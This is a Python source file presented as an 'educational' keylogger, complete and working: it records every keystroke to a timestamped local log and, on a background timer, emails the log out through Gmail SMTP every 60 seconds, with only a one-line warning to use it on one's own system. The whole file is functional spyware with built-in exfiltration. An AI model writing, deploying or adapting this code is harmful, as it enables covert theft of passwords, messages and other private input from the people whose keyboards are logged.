"""
===========================================
KEYLOGGER - EDUCATIONAL SECURITY TOOL
===========================================
Author  : Sneha Chhatri
Purpose : Demonstrates how keyloggers work
Warning : Use only on your own system!
===========================================
"""

import os
import smtplib
import threading
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput import keyboard
from dotenv import load_dotenv
load_dotenv()
# ─────────────────────────────────────────
# CONFIGURATION — credentials from environment
# ─────────────────────────────────────────
LOG_FILE = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "keylog.txt"
)

EMAIL_SENDER   = os.environ.get("EMAIL_ADDRESS", "")
EMAIL_PASSWORD = os.environ.get("EMAIL_PASSWORD", "")
EMAIL_RECEIVER = os.environ.get("EMAIL_ADDRESS", "")
EMAIL_INTERVAL = 60 # seconds


# ─────────────────────────────────────────
# HELPER: Write to log file
# ─────────────────────────────────────────
def write_log(text: str) -> None:
    """Append a timestamped entry to the log file."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {text}\n")


# ─────────────────────────────────────────
# KEYBOARD LISTENERS
# ─────────────────────────────────────────
def on_key_press(key) -> None:
    """Called on every key press — logs character or special key."""
    try:
        write_log(key.char)
    except AttributeError:
        write_log(f"[{key}]")


def on_key_release(key) -> bool:
    """Called on key release — stops listener when ESC pressed."""
    if key == keyboard.Key.esc:
        print("\n[*] ESC detected — keylogger stopped.")
        return False


# ─────────────────────────────────────────
# EMAIL FEATURE
# ─────────────────────────────────────────
def send_email_report() -> None:
    """Read log file and email contents to receiver."""
    try:
        # Check if credentials are set
        if not EMAIL_SENDER or not EMAIL_PASSWORD:
            print("[!] Email credentials not set in environment variables!")
            return

        with open(LOG_FILE, "r", encoding="utf-8") as f:
            content = f.read()

        if not content.strip():
            print("[*] Log file is empty — skipping email.")
            return

        msg = MIMEMultipart()
        msg["From"]    = EMAIL_SENDER
        msg["To"]      = EMAIL_RECEIVER
        msg["Subject"] = f"Keylogger Report — {datetime.now().strftime('%Y-%m-%d %H:%M')}"
        msg.attach(MIMEText(content, "plain"))

        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.send_message(msg)

        print("[*] Email report sent successfully!")

    except FileNotFoundError:
        print("[!] Log file not found — nothing to send.")
    except Exception as e:
        print(f"[!] Email failed: {e}")


def start_email_timer() -> None:
    """Send email every EMAIL_INTERVAL seconds in background."""
    send_email_report()
    timer = threading.Timer(EMAIL_INTERVAL, start_email_timer)
    timer.daemon = True
    timer.start()


# ─────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────
def main() -> None:
    print("=" * 45)
    print("  KEYLOGGER — Educational Security Tool")
    print("=" * 45)
    print(f"[*] Log file  : {LOG_FILE}")
    print(f"[*] Email to  : {EMAIL_RECEIVER or 'Not configured'}")
    print(f"[*] Interval  : Every {EMAIL_INTERVAL} seconds")
    print("[*] Press ESC to stop\n")

    start_email_timer()

    with keyboard.Listener(
        on_press=on_key_press,
        on_release=on_key_release
    ) as listener:
        listener.join()


if __name__ == "__main__":
    main()